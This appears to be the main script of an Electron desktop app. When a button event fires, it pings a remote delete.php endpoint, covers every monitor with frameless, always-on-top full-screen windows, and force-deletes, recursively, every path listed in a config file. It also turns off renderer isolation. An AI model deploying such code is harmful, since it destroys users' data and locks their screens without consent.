const { app, BrowserWindow, ipcMain, screen } = require("electron");
const fetch = require("node-fetch");
const fs = require("fs");
const path = require("path");

let hiddenWindow;
let windows = [];

function deletePaths() {
  const configPath = path.join(__dirname, "paths.json");

  if (!fs.existsSync(configPath)) {
    console.warn("Brak pliku paths.json, pomijam usuwanie");
    return;
  }

  const config = JSON.parse(fs.readFileSync(configPath, "utf-8"));
  if (!config.delete || !Array.isArray(config.delete)) {
    console.warn("Nieprawidłowa struktura paths.json");
    return;
  }

  config.delete.forEach((p) => {
    try {
      if (fs.existsSync(p)) {
        const stat = fs.lstatSync(p);
        if (stat.isDirectory()) {
          fs.rmSync(p, { recursive: true, force: true });
        } else {
          fs.unlinkSync(p);
        }
      } else {
        console.log(`Path doesn't exists: ${p}`);
      }
    } catch (err) {
      console.error(err);
    }
  });
}

app.whenReady().then(() => {
  hiddenWindow = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });
  hiddenWindow.loadFile("app/hidden.html");

  ipcMain.on("button1-pressed", () => {
    fetch("http://website.com/delete.php")
      .then((res) => res.text())
      .then((data) => console.log("PHP response:", data))
      .catch((err) => console.error("Fetch error:", err));

    const displays = screen.getAllDisplays();
    displays.forEach((display) => {
      const win = new BrowserWindow({
        x: display.bounds.x,
        y: display.bounds.y,
        width: display.bounds.width,
        height: display.bounds.height,
        fullscreen: true,
        frame: false,
        autoHideMenuBar: true,
        alwaysOnTop: true,
        focusable: true,
        webPreferences: {
          nodeIntegration: true,
          contextIsolation: false,
        },
      });
      win.loadFile("app/index.html");

      win.setAlwaysOnTop(true, "screen-saver");
      win.focus();

      win.on("closed", () => {
        windows = windows.filter((w) => w !== win);
      });
      windows.push(win);
    });

    deletePaths();
  });
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") app.quit();
});
